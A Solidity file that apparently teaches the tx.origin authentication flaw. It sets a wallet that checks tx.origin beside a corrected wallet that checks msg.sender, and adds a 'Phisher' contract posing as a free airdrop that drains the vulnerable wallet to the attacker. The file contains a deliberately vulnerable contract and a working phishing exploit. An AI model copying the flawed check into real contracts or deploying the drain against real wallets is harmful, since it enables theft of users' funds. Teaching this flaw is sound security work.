// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title tx.origin is not the caller: a wallet that checks the wrong one.
contract OriginWallet {
    address public immutable owner = msg.sender;

    receive() external payable {}

    function transferTo(address payable to, uint256 amount) external {
        require(tx.origin == owner, "Not owner"); // should be msg.sender
        to.transfer(amount);
    }
}

contract SenderWallet {
    address public immutable owner = msg.sender;

    receive() external payable {}

    function transferTo(address payable to, uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        to.transfer(amount);
    }
}

interface IWallet {
    function transferTo(address payable to, uint256 amount) external;
}

/// @notice A "free airdrop" the owner is tricked into calling; it forwards the call to the wallet.
contract Phisher {
    address payable public immutable thief = payable(msg.sender);

    function claimAirdrop(IWallet wallet) external {
        wallet.transferTo(thief, address(wallet).balance);
    }
}
